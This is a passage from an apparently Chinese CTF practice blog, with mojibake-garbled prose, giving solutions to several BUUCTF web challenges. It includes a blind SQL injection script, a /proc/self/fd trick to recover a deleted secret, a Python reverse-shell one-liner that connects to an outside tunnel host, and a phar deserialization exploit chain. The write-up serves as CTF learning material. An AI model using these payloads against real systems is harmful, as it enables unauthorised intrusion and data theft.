url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;index.php&quot;

#payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;
payload &#x3D; &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;
change &#x3D; &#39;&#39;
database&#x3D; &#39;&#39;
for j in range(1,100):
	for i in range(32,128):
		change &#x3D; database+chr(i)
		payload1 &#x3D; payload.format(change)
		print(payload1)
		data &#x3D; &#123;&#39;id&#39;: payload1&#125;	
		r &#x3D; requests.post(url,data&#x3D;data)
		if &#39;Nu1L&#39; in r.text:
			database +&#x3D; chr(i-1)
			print(database)
			break
</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123205558046.png" alt="image-20211123205558046"></p>
<h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>æŠ“åŒ…ä¹‹åä¸€ç›´å¾€ä¸‹èµ°</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211557104.png" alt="image-20211123211557104"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211609605.png" alt="image-20211123211609605"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211625629.png" alt="image-20211123211625629"></p>
<p>æºç é‡Œæ‰¾ä¸åˆ°å°±å»çœ‹js</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211646833.png" alt="image-20211123211646833"></p>
<p>æœ€åå¯ä»¥æ‰¾åˆ°ä¸€ä¸ª</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211708969.png" alt="image-20211123211708969"></p>
<p>éšæœºæ’åˆ—ç»„åˆå¾—åˆ°flag</p>
<pre class="language-none"><code class="language-none">from itertools import permutations
flag &#x3D; [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]
item &#x3D; permutations(flag)#å¯¹flagå…¨æ’åˆ—ï¼Œè¿”å›çš„æ˜¯iteratorsï¼ˆè¿­ä»£å™¨ï¼‰
for i in item:
	k &#x3D; &#39;&#39;.join(i)#joinè¿æ¥æˆä¸ºå­—ç¬¦ä¸²
	if k[-1] &#x3D;&#x3D;&#39;&#125;&#39; and k[0:13] &#x3D;&#x3D; &#39;pctf&#123;hey_boys&#39;:&#x2F;&#x2F;è¿™é‡Œè¿˜å¯ä»¥ç”¨pythonçš„startswichæ–¹æ³•åˆ¤æ–­æ˜¯å¦æ˜¯pctf&#123;heyå¼€å¤´
													&#x2F;&#x2F;if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1] &#x3D;&#x3D;&#39;&#125;&#39;:
		print(k)</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211727781.png" alt="image-20211123211727781"></p>
<h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>æŠ“sessionï¼Œbase64è§£ç æŠŠé‡‘é¢æ”¹æˆ100ï¼Œæ”¾åŒ…</p>
<h2 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124200900405.png" alt="image-20211124200900405"></p>
<p>æºç æ²¡ä¸œè¥¿ï¼Œåªæœ‰ä¸ªurlçš„getå‚æ•°ï¼Œè¿˜ä»¥ä¸ºæ˜¯ssrfä¹‹ç±»çš„ï¼Œæœäº†ä¸‹wpï¼Œè¿™é‡Œå¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒåŸå› ï¼Œæœ‰ä¸ªéé¢„æœŸè§£</p>
<p>éé¢„æœŸè§£ï¼š</p>
<p>æœ‰æ–‡ä»¶è¯»å–ï¼Œç›´æ¥url=/flagå°±èƒ½ä¸‹è½½ä¸€ä¸ªbeautiful.jpg,æ”¹æˆtxtå°±èƒ½çœ‹è§flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124201030250.png" alt="image-20211124201030250"></p>
<p>é¢„æœŸè§£ï¼š</p>
<p><strong>/proc/self/ç›®å½•çš„æ„ä¹‰</strong></p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“å¯ä»¥é€šè¿‡/proc/$pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ã€CPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/$pid/ç›®å½•ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pidï¼Œåœ¨forkã€daemonç­‰æƒ…å†µä¸‹pidè¿˜å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼Œlinuxæä¾›äº†/proc/self/ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº/proc/æœ¬è¿›ç¨‹pid/ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124202121899.png" alt="image-20211124202121899"></p>
<p>è¯»ä¸€ä¸‹app.py</p>
<p>url=app.py</p>
<pre class="language-none"><code class="language-none">from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app &#x3D; Flask(__name__)

SECRET_FILE &#x3D; &quot;&#x2F;tmp&#x2F;secret.txt&quot;
f &#x3D; open(SECRET_FILE)
SECRET_KEY &#x3D; f.read().strip()
os.remove(SECRET_FILE)


@app.route(&#39;&#x2F;&#39;)
def index():
    return render_template(&#39;search.html&#39;)


@app.route(&#39;&#x2F;page&#39;)
def page():
    url &#x3D; request.args.get(&quot;url&quot;)
    try:
        if not url.lower().startswith(&quot;file&quot;):
            res &#x3D; urllib.urlopen(url)
            value &#x3D; res.read()
            response &#x3D; Response(value, mimetype&#x3D;&#39;application&#x2F;octet-stream&#39;)
            response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;beautiful.jpg&#39;
            return response
        else:
            value &#x3D; &quot;HACK ERROR!&quot;
    except:
        value &#x3D; &quot;SOMETHING WRONG!&quot;
    return render_template(&#39;search.html&#39;, res&#x3D;value)


@app.route(&#39;&#x2F;no_one_know_the_manager&#39;)
def manager():
    key &#x3D; request.args.get(&quot;key&quot;)
    print(SECRET_KEY)
    if key &#x3D;&#x3D; SECRET_KEY:
        shell &#x3D; request.args.get(&quot;shell&quot;)
        os.system(shell)
        res &#x3D; &quot;ok&quot;
    else:
        res &#x3D; &quot;Wrong Key!&quot;

    return res


if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8080)
</code></pre>

<p>å¯ä»¥çœ‹åˆ°<code>no_one_know_the_manager</code>ä¸­è¦åŒ¹é…SECRET_KEYï¼Œç„¶åæ‰§è¡Œshellï¼Œä½†æ˜¯SECRET_KEYæ‰€åœ¨çš„secret.txtè¢«åˆ æ‰äº†</p>
<p>ä½†æ˜¯è¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨openæ‰“å¼€çš„ï¼Œä¼šåˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ã€‚</p>
<p>æˆ‘ä»¬è¯»è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸­çš„å†…å®¹å°±å¥½äº†æ­¤å¤„å¯ä»¥é€šè¿‡<code>/proc/pid/fd/</code>è¯»å–ï¼Œè¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124203011498.png" alt="image-20211124203011498"></p>
<p>æ‹¿åˆ°keyçš„å†…å®¹ï¼Œè¦urlç¼–ç ï¼Œä½†æ˜¯shellæ‰§è¡Œçš„å‘½ä»¤ä¸ä¼šè¿”å›ï¼Œè¿™é‡Œä½¿ç”¨åå¼¹shellçš„æ–¹å¼ï¼Œåœ¨æ ¹ç›®å½•ä¸‹è¯»å–flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124203433334.png" alt="image-20211124203433334"></p>
<hr>
<p>nmdå¼¹äº†å‡ ä¸ªå°æ—¶ç»ˆäºå¼¹å‡ºæ¥äº†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/G0AOG@8YB%5BBZ_FAPY%5BLK8VR.png" alt="img"></p>
<p>è¿™ç©æ„è¦å…¬ç½‘ipï¼Œæœäº†ä¸€åœˆæ²¡ä¸€ä¸ªè¯´è¿™ä¸ªäº‹çš„ï¼Œ</p>
<p>æ²¡å…¬ç½‘ipï¼Œæäº†ä¸ªç«¯å£æ˜ å°„åçš„å…¬ç½‘</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41598660/article/details/105254229">(23æ¡æ¶ˆæ¯) ç«¯å£æ˜ å°„åçš„å…¬ç½‘åå¼¹shell_æ¥åˆ°äº†å­¦æ¸£çš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://natapp.cn/register">https://natapp.cn/register</a></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125001711038.png" alt="image-20211125001711038"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125001738005.png" alt="image-20211125001738005"></p>
<p>æŠŠæœ¬åœ°çš„8082ç«¯å£æ˜ å°„åˆ°å…¬ç½‘</p>
<p>æŠŠè¿™ä¸ªpayloadå½“shellå‚æ•°çš„å€¼æ‰“è¿›å»</p>
<pre class="language-none"><code class="language-none">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;server.natappfree.cc&#39;,xxxxx));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</code></pre>

<p>ç„¶ååœ¨Ubuntué‡Œç›‘å¬8082ç«¯å£ï¼Œä»æ ¹ç›®å½•é‡Œæ‰¾åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/G0AOG@8YB%5BBZ_FAPY%5BLK8VR.png" alt="img"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125002051230.png" alt="image-20211125002051230"></p>
<p>æ³ªç›®</p>
<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯è¿™ä¸ªflieå‚æ•°æ„Ÿè§‰å¯ä»¥ç›´æ¥æ–‡ä»¶è¯»å–</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125203202419.png" alt="image-20211125203202419"></p>
<p>index.php</p>
<pre class="language-none"><code class="language-none">&lt;?php 
header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  
include &#39;base.php&#39;;
?&gt; </code></pre>

<p>base.php</p>
<pre class="language-none"><code class="language-none">&lt;?php 
    session_start(); 
?&gt; 
&lt;!DOCTYPE html&gt; 
&lt;html&gt; 
&lt;head&gt; 
    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; 
    &lt;title&gt;web3&lt;&#x2F;title&gt; 
    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot;&gt; 
    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;2.1.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt; 
    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt; 
&lt;&#x2F;head&gt; 
&lt;body&gt; 
    &lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt; 
        &lt;div class&#x3D;&quot;container-fluid&quot;&gt; 
        &lt;div class&#x3D;&quot;navbar-header&quot;&gt; 
            &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;index.php&quot;&gt;é¦–é¡µ&lt;&#x2F;a&gt; 
        &lt;&#x2F;div&gt; 
            &lt;ul class&#x3D;&quot;nav navbar-nav navbra-toggle&quot;&gt; 
                &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;file.php?file&#x3D;&quot;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; 
                &lt;li&gt;&lt;a href&#x3D;&quot;upload_file.php&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; 
            &lt;&#x2F;ul&gt; 
            &lt;ul class&#x3D;&quot;nav navbar-nav navbar-right&quot;&gt; 
                &lt;li&gt;&lt;a href&#x3D;&quot;index.php&quot;&gt;&lt;span class&#x3D;&quot;glyphicon glyphicon-user&quot;&gt;&lt;&#x2F;span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; 
            &lt;&#x2F;ul&gt; 
        &lt;&#x2F;div&gt; 
    &lt;&#x2F;nav&gt; 
&lt;&#x2F;body&gt; 
&lt;&#x2F;html&gt; 
&lt;!--flag is in f1ag.php--&gt;</code></pre>

<p>file.php</p>
<pre class="language-none"><code class="language-none">&lt;?php 
header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  
include &#39;function.php&#39;; 
include &#39;class.php&#39;; 
ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); 
$file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; 
if(empty($file)) &#123; 
    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; 
&#125; 
$show &#x3D; new Show(); 
if(file_exists($file)) &#123; 
    $show-&gt;source &#x3D; $file; 
    $show-&gt;_show(); 
&#125; else if (!empty($file))&#123; 
    die(&#39;file doesn\&#39;t exists.&#39;); 
&#125; 
?&gt; </code></pre>

<p>upload_file.php</p>
<pre class="language-none"><code class="language-none">&lt;?php 
include &#39;function.php&#39;; 
upload_file(); 
?&gt; 
&lt;html&gt; 
&lt;head&gt; 
&lt;meta charest&#x3D;&quot;utf-8&quot;&gt; 
&lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;&#x2F;title&gt; 
&lt;&#x2F;head&gt; 
&lt;body&gt; 
&lt;div align &#x3D; &quot;center&quot;&gt; 
        &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;&#x2F;h1&gt; 
&lt;&#x2F;div&gt; 
&lt;style&gt; 
    p&#123; margin:0 auto&#125; 
&lt;&#x2F;style&gt; 
&lt;div&gt; 
&lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; 
    &lt;label for&#x3D;&quot;file&quot;&gt;æ–‡ä»¶å:&lt;&#x2F;label&gt; 
    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt; 
    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;æäº¤&quot;&gt; 
&lt;&#x2F;div&gt; 

&lt;&#x2F;script&gt; 
&lt;&#x2F;body&gt; 
&lt;&#x2F;html&gt;</code></pre>

<p>class.php</p>
<pre class="language-none"><code class="language-none">&lt;?php 
&#x2F;&#x2F;show_source(__FILE__); 
include &quot;base.php&quot;; 
header(&quot;Content-type: text&#x2F;html;charset&#x3D;utf-8&quot;); 
error_reporting(0); 
function upload_file_do() &#123; 
    global $_FILES; 
    $filename &#x3D; md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; 
    &#x2F;&#x2F;mkdir(&quot;upload&quot;,0777); 
    if(file_exists(&quot;upload&#x2F;&quot; . $filename)) &#123; 
        unlink($filename); 
    &#125; 
    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $filename); 
    echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;&#x2F;script&gt;&#39;; 
&#125; 
function upload_file() &#123; 
    global $_FILES; 
    if(upload_file_check()) &#123; 
        upload_file_do(); 
    &#125; 
&#125; 
function upload_file_check() &#123; 
    global $_FILES; 
    $allowed_types &#x3D; array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); 
    $temp &#x3D; explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); 
    $extension &#x3D; end($temp); 
    if(empty($extension)) &#123; 
        &#x2F;&#x2F;echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4&#x2F;&gt;&quot;; 
    &#125; 
    else&#123; 
        if(in_array($extension,$allowed_types)) &#123; 
            return true; 
        &#125; 
        else &#123; 
            echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;&#x2F;script&gt;&#39;; 
            return false; 
        &#125; 
    &#125; 
&#125; 
?&gt; </code></pre>

<p>class.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
class C1e4r
&#123;
    public $test;
    public $str;
    public function __construct($name)
    &#123;
        $this-&gt;str &#x3D; $name;
    &#125;
    public function __destruct()
    &#123;
        $this-&gt;test &#x3D; $this-&gt;str;
        echo $this-&gt;test;
    &#125;
&#125;

class Show
&#123;
    public $source;
    public $str;
    public function __construct($file)
    &#123;
        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg
        echo $this-&gt;source;
    &#125;
    public function __toString()
    &#123;
        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;
        return $content;
    &#125;
    public function __set($key,$value)
    &#123;
        $this-&gt;$key &#x3D; $value;
    &#125;
    public function _show()
    &#123;
        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\.\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;
            die(&#39;hacker!&#39;);
        &#125; else &#123;
            highlight_file($this-&gt;source);
        &#125;
        
    &#125;
    public function __wakeup()
    &#123;
        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;
            echo &quot;hacker~&quot;;
            $this-&gt;source &#x3D; &quot;index.php&quot;;
        &#125;
    &#125;
&#125;
class Test
&#123;
    public $file;
    public $params;
    public function __construct()
    &#123;
        $this-&gt;params &#x3D; array();
    &#125;
    public function __get($key)
    &#123;
        return $this-&gt;get($key);
    &#125;
    public function get($key)
    &#123;
        if(isset($this-&gt;params[$key])) &#123;
            $value &#x3D; $this-&gt;params[$key];
        &#125; else &#123;
            $value &#x3D; &quot;index.php&quot;;
        &#125;
        return $this-&gt;file_get($value);
    &#125;
    public function file_get($value)
    &#123;
        $text &#x3D; base64_encode(file_get_contents($value));
        return $text;
    &#125;
&#125;
?&gt;</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125204709437.png" alt="image-20211125204709437"></p>
<p>è‚¯å®šæ˜¯ç”¨è¿™ä¸ªå‡½æ•°æ¥è¯»å–flagæ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰ååºåˆ—åŒ–çš„åœ°æ–¹</p>
<p>åŠ ä¸ªæ–°çŸ¥è¯†</p>
<p><strong>åˆ©ç”¨pharåè®®å®ç°ååºåˆ—åŒ–æ¼æ´æ”»å‡»</strong></p>
<p><strong>æ¼æ´æˆå› </strong> </p>
<p>pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼›è¯¥æ–¹æ³•åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°(file_exists()ã€is_dir()ç­‰)å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆphar://ä¼ªåè®®ï¼Œå¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p>
<p>åŸç†åˆ†æ </p>
<p>pharçš„ç»„æˆ</p>
<p>é€šè¿‡æŸ¥é˜…æ‰‹å†Œå‘ç°pharç”±å››éƒ¨åˆ†ç»„æˆï¼›ç¿»é˜…æ‰‹å†Œå¯ä»¥çŸ¥é“ï¼Œpharç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯<code>stubã€manifest describing the contentsã€ the file contentsã€ [optional] a signature for verifying Phar integrity (phar file format only)</code> ä¸‹é¢è¿›è¡Œè§£é‡Šä¸€ä¸‹ï¼›</p>
<p>1 .0  a stub</p>
<p>æ ‡è¯†ä½œç”¨ï¼Œæ ¼å¼ä¸º</p>
<pre class="language-none"><code class="language-none">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code></pre>

<p>ï¼Œå‰é¢ä»»æ„ï¼Œä½†æ˜¯ä¸€å®šè¦ä»¥__HALT_COMPILER();?&gt;ç»“å°¾ï¼Œå¦åˆ™phpæ— æ³•è¯†åˆ«è¿™æ˜¯ä¸€ä¸ªpharæ–‡ä»¶ï¼›</p>
<p>2 .0 </p>
<p>a manifest describing the contents</p>
<p>å…¶å®å¯ä»¥ç†è§£ä¸ºpharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸­å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æœ‰å‹ç¼©ä¿¡æ¯å’Œæƒé™ï¼Œå½“ç„¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„åºåˆ—åŒ–ä¹Ÿåœ¨é‡Œé¢ï¼›</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/425be1b3b3df9e7799bbae0ade22b5ac-16378452560562.png" alt="425be1b3b3df9e7799bbae0ade22b5ac.png"></p>
<p>3 .0 the file contents</p>
<p>è¿™é‡ŒæŒ‡çš„æ˜¯è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼›</p>
<p>4 .0 [optional] a signature for verifying Phar integrity (phar file format only)</p>
<p>ç­¾åï¼Œæ”¾åœ¨ç»“å°¾ï¼›</p>
<p><strong>C1e4rç±»ä¸­æœ‰__destruct(),</strong></p>
<p>__destruct()æ˜¯PHPä¸­çš„ææ„æ–¹æ³•ï¼Œåœ¨å¯¹è±¡è¢«é”€æ¯æ—¶è¢«è°ƒç”¨ï¼Œç¨‹åºç»“æŸæ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨é”€æ¯å¯¹è±¡ã€‚</p>
<p>å‡½æ•°ä¸­å‘ç°äº†echoï¼Œé‚£ä¹ˆè¦åˆ©ç”¨echo $this-&gt;testã€‚</p>
<p><strong>showç±»æœ‰__toString(),</strong></p>
<p>__toStringæ–¹æ³•åœ¨å°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œæ¯”å¦‚è¿›è¡Œechoï¼Œprintæ“ä½œæ—¶ä¼šè¢«è°ƒç”¨å¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p>åˆ©ç”¨$this-&gt;str[&#39;str&#39;]-&gt;source;</p>
<p><strong>Testç±»æœ‰__getï¼ˆï¼‰</strong></p>
<p>__getï¼ˆï¼‰å½“æœªå®šä¹‰çš„å±æ€§æˆ–æ²¡æœ‰æƒé™è®¿é—®çš„å±æ€§è¢«è®¿é—®æ—¶è¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</p>
<p>åˆ©ç”¨ $this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value));</p>
<p>åˆ©ç”¨C1e4rç±»çš„<code>__destruct()</code>ä¸­çš„echo this-&gt;test<br>2.è§¦å‘Showç±»çš„<code>__toString()</code><br>3.åˆ©ç”¨Showç±»çš„<code>this-&gt;test2.è§¦å‘Showç±»çš„</code>__toString()<code>3.åˆ©ç”¨Showç±»çš„</code>content = $this-&gt;str[&#39;str&#39;]-&gt;source<code>4.è§¦å‘Testç±»çš„</code>__get()<code>5.æˆåŠŸåˆ©ç”¨</code>file_get()`è¯»æ–‡ä»¶</p>
<p>ååºåˆ—åŒ–ç»“æœ</p>
<pre class="language-none"><code class="language-none">&lt;?php
class C1e4r
&#123;
    public $test;
    public $str;
&#125;

class Show
&#123;
    public $source;
    public $str;
&#125;
class Test
&#123;
    public $file;
    public $params;
&#125;
$a &#x3D; new C1e4r();
$b &#x3D; new Show();
$c &#x3D; new Test();
$a -&gt;str &#x3D; $b;
$b -&gt;str[&#39;str&#39;] &#x3D; $c;
$c -&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;;


$phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.pharæ–‡ä»¶
$phar-&gt;startBuffering();
$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;å›ºå®šçš„
$phar-&gt;setMetadata($a); &#x2F;&#x2F;è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡
$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å
$phar-&gt;stopBuffering();

?&gt;
</code></pre>

<p>ç”Ÿæˆpharæ–‡ä»¶åï¼Œæ”¹ä¸ªåç¼€ä¸Šä¼ å°±è¡Œï¼Œpharçš„æ–‡ä»¶ä¸ç®¡ä»€ä¹ˆåç¼€éƒ½ä¼šç›´æ¥æ‰§è¡Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125235333537.png" alt="image-20211125235333537"></p>
<p>çœ‹ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆä¹Ÿå¯ä»¥æ ¹æ®æºç æ¨æ–‡ä»¶åï¼Œç„¶ååˆ©ç”¨phar://åè®®è®¿é—®</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125235401120.png" alt="image-20211125235401120"></p>
<p>å¾—åˆ°flag</p>
